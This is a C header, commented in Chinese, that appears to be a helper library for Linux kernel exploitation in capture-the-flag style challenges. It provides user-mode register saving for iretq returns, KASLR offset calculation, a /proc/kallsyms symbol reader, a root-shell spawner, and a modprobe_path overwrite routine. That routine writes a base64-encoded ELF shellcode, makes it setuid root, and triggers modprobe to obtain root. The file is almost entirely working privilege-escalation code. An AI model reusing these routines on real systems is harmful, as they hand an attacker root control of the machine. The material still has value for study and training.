/**
 * demo kernel模块
 *
 * main中使用demo模块
 * #define DEMO_KERNEL
 * #include <demo_kernel.h>
 *
 * 其余文件使用demo模块
 * #include <demo_kernel.h>
 */
#ifndef DEMO_KERNEL_H_
#define DEMO_KERNEL_H_

#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <sched.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <unistd.h>
#include <assert.h>
#include <signal.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#include <demo.h>

#define DEMO_KERNEL_VERSION "demo 1.0.0"

/**
 * \brief 提权后调用shell
 */
void kernel_shell();

/**
 * 用于保存用户态寄存器
 * 切换用户态布置栈
 * swapgs
 * iretq
 * user_shell_addr
 * user_cs
 * user_rflags
 * user_sp
 * user_ss
 */
void kernel_save_status();

/**
 * \brief 计算offset
 * \param symbol_addr: 符号地址
 * \param symbol_real_addr: 符号真实地址
 * \return 从符号地址到符号真实地址的偏移
 * \note
 *      u64 commit_creds = 0xffffffff8109c8e0;              // 符号地址
 *      s64 offset = kernel_offset(symbol_addr, real_addr); // 计算offset
 *      commit_creds += offset;                             // 实际地址
 */
static inline s64 kernel_offset(u64 symbol_addr, u64 symbol_real_addr)
{
    return (s64)(symbol_real_addr - symbol_addr);
}

/**
 * \brief 创建一个假的modprobe文件/tmp/x，并创建异常文件/tmp/err，执行异常文件触发modprobe后会设置/tmp/x的s权限并重新写入x用于获取root
 * \param x: 假的modprobe路径，会自动创建
 * \param err_elf: shell程序路径，会自动创建
 * \note    设置modprobe_path路径为/tmp/x,
 *          然后调用kernel_modprobe_create_fake_modprobe("/tmp/x", "/tmp/err", true);即可获得root权限
 */
void kernel_modprobe_create_fake_modprobe(char *x, char *err_elf, bool run);

/**
 * \brief 获取内核符号地址
 * \param name: 符号名称
 * \param file: 符号文件路径, 如 /proc/kallsyms
 * \return 符号信息
 */
symbol *kernel_get_symbol_from_file(char *name, char *file);

#ifdef DEMO_KERNEL

void kernel_shell()
{
    if (!getuid())
    {
        SUCESS("root success\n");
        system("/bin/sh");
    }
    else
    {
        ERROR("root fail\n");
    }
    exit(0);
}

/**
 * 切换用户态布置栈:
 *
 * swapgs
 * iretq
 * user_shell_addr
 * user_cs
 * user_rflags
 * user_sp
 * user_ss
 *
 * 注意:    在返回用户态执行 system() 函数时同样有可能遇到栈不平衡导致函数执行失败并最终 Segmentation Fault 的问题
 *          因此在本地调试时若遇到此类问题，则可以将 user_sp 的值加减 8 以进行调整。
 */
u64 user_cs, user_rflags, user_sp, user_ss;

void kernel_save_status()
{
    asm volatile(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;");
}

void kernel_modprobe_create_fake_modprobe(char *x, char *err_elf, bool run)
{
    char content[0x200] = {0};
    sprintf(content,
            "#!/bin/sh\n"
            "echo 'f0VMRgIBAQMAAAAAAAAAAAIAPgABAAAAyBBAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAACAEAAAAAAAAEAAAAGAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAyAAAAAAAAADIAAAAAAAAAAAQAAAAAAAAAQAAAAUAAADIAAAAAAAAAMgQQAAAAAAAyBBAAAAAAAA4AAAAAAAAADgAAAAAAAAAABAAAAAAAAAvYmluL3NoALAAQAAAAAAAAAAAAAAAAABIMf9IMfa4agAAAA8FSDH/SDH2uHEAAAAPBUiNPcfv//9IjTXI7///SDHAsDsPBbg8AAAAMf8PBQ==' | base64 -d > %s\n"
            "chown 0:0 %s\n"
            "chmod u+s %s\n",
            x, x, x);

    int fd = open(x, O_WRONLY | O_CREAT | O_NOCTTY | O_NONBLOCK, 0755);
    write(fd, content, strlen(content));
    close(fd);

    fd = open(err_elf, O_WRONLY | O_CREAT | O_NOCTTY | O_NONBLOCK, 0755);
    write(fd, "\xff\xff\xff\xff", 4);
    close(fd);

    if (run == true)
    {
        system(err_elf);
        system(x);
    }
}

void kernel_bind_cpu(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

symbol *kernel_get_symbol_from_file(char *name, char *file)
{
    FILE *fp;
    char line[0x100];
    symbol *sym = NULL;

    fp = fopen(file, "r");
    if (fp == NULL)
    {
        perror("无法打开 [/proc/kallsyms] 文件");
        return NULL;
    }

    while (fgets(line, sizeof(line), fp) != NULL)
    {
        if (strstr(line, name))
        {
            sym = malloc(sizeof(symbol));
            sscanf(line, "%llx %s %s", &sym->addr, sym->type, sym->name);
            break;
        }
    }

    fclose(fp);

    if (sym == NULL)
        perror("获取符号失败");

    return sym;
}

#endif

#endif // DEMO_KERNEL_H_